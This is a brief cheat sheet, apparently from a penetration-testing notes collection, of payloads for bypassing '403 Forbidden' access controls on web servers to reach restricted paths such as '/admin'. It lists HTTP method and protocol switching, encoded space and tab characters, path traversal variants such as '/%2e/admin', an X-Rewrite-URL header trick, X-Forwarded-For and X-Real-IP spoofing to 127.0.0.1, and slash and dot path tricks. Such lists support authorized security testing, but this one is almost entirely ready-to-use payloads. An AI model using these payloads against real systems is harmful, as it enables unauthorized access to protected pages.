### Change request method.
```
POST -> GET
GET -> POST
```

### Change Protocol
```
http -> https
https -> http
```

### Use space symbol.
```
GET /admin%20
GET /admin%09
```

### X-Rewrite-URL header
```
GET /index.html
X-Rewrite-URL: /admin
```
### Use Path Traversal
```
GET /%2e/admin
GET /admin/..;/
```
			
### X-Real-IP/X-Forwrded-For
```
GET /admin
X-Real-IP: 127.0.0.1
```
```
GET /admin
X-Forwarded-For: 127.0.0.1
```

### Other Techniques
target.com/secret -> ```403 Forbidden```

target.com/secret/ -> ```200 Ok```

target.com//secret// -> ```200 Ok```

target.com/./secret/./ -> ```200 Ok```

target.com/secret/* -> ```200 Ok```

target.com/. -> ```200 Ok```
